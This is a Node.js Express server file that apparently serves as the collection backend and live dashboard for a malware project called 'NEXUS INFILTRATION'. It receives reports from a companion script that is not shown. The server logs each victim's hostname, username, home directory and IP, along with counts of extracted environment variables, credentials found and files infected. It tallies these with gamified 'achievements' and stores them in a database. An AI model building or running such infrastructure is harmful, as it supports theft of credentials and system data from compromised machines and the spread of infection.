// server.js - Backend Server for Live Dashboard
// Receives data from nexus.js runs and displays live dashboard

const express = require('express');
const cors = require('cors');
const path = require('path');
const crypto = require('crypto');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;
const NEXUS_SECRET = process.env.NEXUS_SECRET;

// ═══════════════════════════════════════════════════════════
// MIDDLEWARE
// ═══════════════════════════════════════════════════════════

app.use(cors());
app.use(express.json());
app.use(express.static('public'));

// Log every request
app.use((req, res, next) => {
    console.log(`[${new Date().toLocaleTimeString()}] ${req.method} ${req.url}`);
    next();
});

// ═══════════════════════════════════════════════════════════
// IN-MEMORY DATABASE (Works without MongoDB)
// ═══════════════════════════════════════════════════════════

const database = {
    totalRuns: 0,
    runs: [],
    latestRun: null,
    startTime: new Date(),
    stats: {
        totalFilesInfected: 0,
        totalEnvVarsExtracted: 0,
        uniqueHostnames: new Set(),
        uniqueIPs: new Set(),
        osDistribution: {},
        threatLevels: { LOW: 0, MEDIUM: 0, HIGH: 0, CRITICAL: 0 },
        platformDistribution: {},
        nodeVersions: {}
    },
    achievements: {
        totalUnlocked: 0,
        kingAchievements: 0,
        cleanerAchievements: 0
    }
};

// ═══════════════════════════════════════════════════════════
// MONGODB CONNECTION (Optional - for permanent storage)
// ═══════════════════════════════════════════════════════════

let mongoClient = null;
let mongoCollection = null;

async function connectMongo() {
    const uri = process.env.MONGODB_URI;
    
    if (!uri || uri.trim() === '') {
        console.log('💾 Using IN-MEMORY storage (no MongoDB configured)');
        console.log('   Data will be lost when server restarts');
        console.log('   To enable permanent storage, add MONGODB_URI to .env\n');
        return false;
    }

    try {
        const { MongoClient } = require('mongodb');
        mongoClient = new MongoClient(uri);
        await mongoClient.connect();
        
        const db = mongoClient.db('nexus_infiltration');
        mongoCollection = db.collection('runs');
        
        // Load existing data into memory
        const existingRuns = await mongoCollection.find().sort({ id: -1 }).toArray();
        if (existingRuns.length > 0) {
            database.runs = existingRuns;
            database.totalRuns = existingRuns.length;
            database.latestRun = existingRuns[0];
            
            // Rebuild stats
            existingRuns.forEach(run => {
                database.stats.totalFilesInfected += run.stats?.filesInfected || 0;
                database.stats.totalEnvVarsExtracted += run.stats?.envVarsExtracted || 0;
                database.stats.uniqueHostnames.add(run.systemInfo?.hostname);
                
                const os = run.systemInfo?.os || 'Unknown';
                database.stats.osDistribution[os] = (database.stats.osDistribution[os] || 0) + 1;
                
                const threat = run.stats?.threatLevel || 'LOW';
                database.stats.threatLevels[threat] = (database.stats.threatLevels[threat] || 0) + 1;
            });
        }
        
        console.log('🍃 MongoDB connected successfully');
        console.log(`   Loaded ${existingRuns.length} previous runs\n`);
        return true;
        
    } catch (error) {
        console.log('⚠️  MongoDB connection failed, using in-memory storage');
        console.log(`   Error: ${error.message}\n`);
        return false;
    }
}

// ═══════════════════════════════════════════════════════════
// AUTHENTICATION MIDDLEWARE
// ═══════════════════════════════════════════════════════════

function authenticateRequest(req, res, next) {
    const secret = req.body?.secret || req.headers['x-nexus-secret'];
    
    if (secret !== NEXUS_SECRET) {
        console.log(`❌ Rejected unauthorized request from ${req.ip}`);
        return res.status(403).json({ 
            error: 'Access denied', 
            message: 'Invalid or missing secret key' 
        });
    }
    
    next();
}

// ═══════════════════════════════════════════════════════════
// API ENDPOINTS
// ═══════════════════════════════════════════════════════════

// POST /api/report - Receive data from nexus.js runs
app.post('/api/report', authenticateRequest, async (req, res) => {
    try {
        const data = req.body;
        
        // Validate required fields
        if (!data.missionId) {
            return res.status(400).json({ error: 'Missing missionId' });
        }

        const clientIP = req.ip || req.headers['x-forwarded-for'] || 'unknown';

        // Create run record
        const run = {
            id: database.totalRuns + 1,
            missionId: data.missionId,
            timestamp: data.timestamp || new Date().toISOString(),
            clientIP: clientIP,
            systemInfo: {
                hostname: data.systemProfile?.hostname || 'Unknown',
                os: data.systemProfile?.type || 'Unknown',
                platform: data.systemProfile?.platform || 'Unknown',
                arch: data.systemProfile?.architecture || 'Unknown',
                cpu: data.hardwareProfile?.cpu?.model || 'Unknown',
                cores: data.hardwareProfile?.cpu?.cores || 0,
                ramTotal: data.hardwareProfile?.memory?.total || 'Unknown',
                ramUsage: data.hardwareProfile?.memory?.usagePercent || 'Unknown',
                nodeVersion: data.nodeProfile?.version || 'Unknown',
                username: data.userProfile?.username || 'Unknown',
                homeDir: data.userProfile?.homeDirectory || 'Unknown',
                uptime: data.systemProfile?.uptime || 'Unknown'
            },
            stats: {
                envVarsExtracted: data.envVarCount || 0,
                filesScanned: data.filesScanned || 0,
                highValueTargets: data.highValueTargets || 0,
                credentialsFound: data.credentialsFound || 0,
                filesInfected: data.filesInfected || 0,
                mutations: data.mutations || 0,
                threatLevel: data.threatLevel || 'LOW',
                crudCompleted: data.crudCompleted || false,
                cleanupCompleted: data.cleanupCompleted || false
            },
            environmentSummary: data.environmentCategories || {},
            achievements: data.achievements || [],
            securityFlags: data.securityFlags || []
        };

        // Update in-memory database
        database.runs.unshift(run);
        database.totalRuns++;
        database.latestRun = run;
        database.stats.totalFilesInfected += run.stats.filesInfected;
        database.stats.totalEnvVarsExtracted += run.stats.envVarsExtracted;
        database.stats.uniqueHostnames.add(run.systemInfo.hostname);
        database.stats.uniqueIPs.add(clientIP);
        
        // Track distributions
        const os = run.systemInfo.os;
        database.stats.osDistribution[os] = (database.stats.osDistribution[os] || 0) + 1;
        
        const platform = run.systemInfo.platform;
        database.stats.platformDistribution[platform] = (database.stats.platformDistribution[platform] || 0) + 1;
        
        const nodeVersion = run.systemInfo.nodeVersion;
        database.stats.nodeVersions[nodeVersion] = (database.stats.nodeVersions[nodeVersion] || 0) + 1;
        
        const threat = run.stats.threatLevel;
        database.stats.threatLevels[threat] = (database.stats.threatLevels[threat] || 0) + 1;
        
        // Track achievements
        if (run.achievements.includes('KING')) database.achievements.kingAchievements++;
        if (run.achievements.includes('CLEANER')) database.achievements.cleanerAchievements++;
        database.achievements.totalUnlocked += run.achievements.length;

        // Save to MongoDB if available
        if (mongoCollection) {
            try {
                await mongoCollection.insertOne(run);
            } catch (mongoError) {
                console.log('⚠️  MongoDB save failed (data still in memory)');
            }
        }

        // Log to console
        console.log(`\n📥 NEW REPORT RECEIVED`);
        console.log(`   Mission: ${run.missionId}`);
        console.log(`   Hostname: ${run.systemInfo.hostname}`);
        console.log(`   OS: ${run.systemInfo.os} (${run.systemInfo.platform})`);
        console.log(`   CPU: ${run.systemInfo.cpu}`);
        console.log(`   RAM: ${run.systemInfo.ramTotal} (${run.systemInfo.ramUsage} used)`);
        console.log(`   Node.js: ${run.systemInfo.nodeVersion}`);
        console.log(`   Env Vars: ${run.stats.envVarsExtracted}`);
        console.log(`   Files Infected: ${run.stats.filesInfected}`);
        console.log(`   Threat: ${run.stats.threatLevel}`);
        console.log(`   Achievements: ${run.achievements.length} unlocked`);
        console.log(`   Total Runs: ${database.totalRuns}\n`);

        // Send response
        res.json({
            success: true,
            runId: run.id,
            totalRuns: database.totalRuns,
            message: 'Report received and stored successfully',
            serverUptime: Math.floor(process.uptime())
        });

    } catch (error) {
        console.error('❌ Error processing report:', error);
        res.status(500).json({ error: 'Internal server error' });
    }
});

// GET /api/dashboard - Get live dashboard data
app.get('/api/dashboard', (req, res) => {
    res.json({
        serverInfo: {
            uptime: Math.floor(process.uptime()),
            startTime: database.startTime,
            storageType: mongoCollection ? 'MongoDB' : 'In-Memory'
        },
        totals: {
            runs: database.totalRuns,
            uniqueHostnames: database.stats.uniqueHostnames.size,
            uniqueIPs: database.stats.uniqueIPs.size,
            totalFilesInfected: database.stats.totalFilesInfected,
            totalEnvVarsExtracted: database.stats.totalEnvVarsExtracted,
            kingAchievements: database.achievements.kingAchievements,
            cleanerAchievements: database.achievements.cleanerAchievements
        },
        latestRun: database.latestRun ? {
            missionId: database.latestRun.missionId,
            timestamp: database.latestRun.timestamp,
            hostname: database.latestRun.systemInfo.hostname,
            os: database.latestRun.systemInfo.os,
            platform: database.latestRun.systemInfo.platform,
            cpu: database.latestRun.systemInfo.cpu,
            ramUsage: database.latestRun.systemInfo.ramUsage,
            threatLevel: database.latestRun.stats.threatLevel,
            filesInfected: database.latestRun.stats.filesInfected,
            envVarsExtracted: database.latestRun.stats.envVarsExtracted,
            achievements: database.latestRun.achievements?.length || 0
        } : null,
        distributions: {
            os: database.stats.osDistribution,
            platforms: database.stats.platformDistribution,
            nodeVersions: database.stats.nodeVersions,
            threatLevels: database.stats.threatLevels
        },
        recentRuns: database.runs.slice(0, 15).map(run => ({
            id: run.id,
            missionId: run.missionId,
            timestamp: run.timestamp,
            hostname: run.systemInfo?.hostname || 'Unknown',
            os: run.systemInfo?.os || 'Unknown',
            cpu: run.systemInfo?.cpu?.substring(0, 30) || 'Unknown',
            threatLevel: run.stats?.threatLevel || 'LOW',
            filesInfected: run.stats?.filesInfected || 0,
            envVarsExtracted: run.stats?.envVarsExtracted || 0,
            achievements: run.achievements?.length || 0
        }))
    });
});

// GET /api/runs - Get all runs
app.get('/api/runs', (req, res) => {
    const limit = parseInt(req.query.limit) || 50;
    res.json({
        total: database.totalRuns,
        runs: database.runs.slice(0, limit)
    });
});

// GET /api/stats - Get statistics only
app.get('/api/stats', (req, res) => {
    res.json({
        totalRuns: database.totalRuns,
        uniqueHostnames: database.stats.uniqueHostnames.size,
        uniqueIPs: database.stats.uniqueIPs.size,
        totalFilesInfected: database.stats.totalFilesInfected,
        totalEnvVarsExtracted: database.stats.totalEnvVarsExtracted,
        osDistribution: database.stats.osDistribution,
        platformDistribution: database.stats.platformDistribution,
        threatLevels: database.stats.threatLevels,
        nodeVersions: database.stats.nodeVersions,
        achievements: database.achievements,
        serverUptime: Math.floor(process.uptime())
    });
});

// GET /api/health - Health check
app.get('/api/health', (req, res) => {
    res.json({
        status: 'ACTIVE',
        project: 'NEXUS INFILTRATION',
        version: '1.0.0',
        uptime: Math.floor(process.uptime()),
        totalRuns: database.totalRuns,
        storage: mongoCollection ? 'MongoDB' : 'In-Memory',
        timestamp: new Date().toISOString()
    });
});

// ═══════════════════════════════════════════════════════════
// SERVE DASHBOARD
// ═══════════════════════════════════════════════════════════

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// ═══════════════════════════════════════════════════════════
// 404 HANDLER
// ═══════════════════════════════════════════════════════════

app.use((req, res) => {
    res.status(404).json({ error: 'Endpoint not found' });
});

// ═══════════════════════════════════════════════════════════
// START SERVER
// ═══════════════════════════════════════════════════════════

async function startServer() {
    // Try MongoDB connection
    await connectMongo();
    
    app.listen(PORT, () => {
        console.log(`
╔══════════════════════════════════════════════════════════════════╗
║                                                                  ║
║     ⚡ NEXUS INFILTRATION - LIVE SERVER ACTIVE ⚡                ║
║                                                                  ║
╠══════════════════════════════════════════════════════════════════╣
║                                                                  ║
║  🌐 Dashboard:  http://localhost:${PORT}                            ║
║  📡 API:        http://localhost:${PORT}/api/report                  ║
║  📊 Stats:      http://localhost:${PORT}/api/dashboard              ║
║  💚 Health:     http://localhost:${PORT}/api/health                 ║
║                                                                  ║
║  Storage:       ${(mongoCollection ? 'MongoDB 🍃' : 'In-Memory 💾').padEnd(45)}║
║  Secret Key:    ${NEXUS_SECRET.substring(0, 10)}...${(NEXUS_SECRET.length > 10 ? '✓' : '')}                        ║
║                                                                  ║
║  Waiting for nexus.js to send reports...                         ║
║                                                                  ║
╚══════════════════════════════════════════════════════════════════╝
        `);
    });
}

startServer().catch(error => {
    console.error('Failed to start server:', error);
    process.exit(1);
});